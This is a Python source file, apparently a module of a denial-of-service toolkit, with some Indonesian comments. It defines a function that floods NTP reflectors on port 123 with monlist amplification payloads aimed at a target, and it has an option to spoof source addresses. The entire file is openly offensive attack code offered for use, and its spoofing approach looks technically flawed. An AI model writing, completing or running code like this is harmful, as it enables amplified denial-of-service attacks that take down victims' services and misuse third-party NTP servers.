import socket
import time
import logging
import random
import struct
from utils import spoofing, amplification

log = logging.getLogger(__name__)

def attack(target, reflectors, duration=60, spoof=False):
    start_time = time.time()
    end_time = start_time + duration
    packets_sent = 0

    # NTP monlist request (sangat umum, tapi sering diblokir)
    payload = amplification.generate_amplification_payload(target, service="ntp")
    if not payload:
        log.error("Could not generate NTP amplification payload.")
        return


    try:
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                if spoof:
                    # Set source IP (spoofed)
                    s.bind((spoofing.generate_random_ip(), random.randint(1024,65535) )) #Spoofing
                reflector = random.choice(reflectors) # Pilih reflector Acak
                s.sendto(payload, (reflector, 123))  # Kirim ke reflector:port
                packets_sent += 1
            except socket.error as e:
                log.error(f"Socket error: {e}")
                continue #Coba lagi, jangan berhenti.
            except Exception as e:
                log.exception(f"An unexpected error occurred: {e}")
                break # Error fatal

    except KeyboardInterrupt:
      pass
    finally:
      if 's' in locals() and s:
        s.close()
      log.info(f"NTP amplification attack finished. Sent {packets_sent} packets.")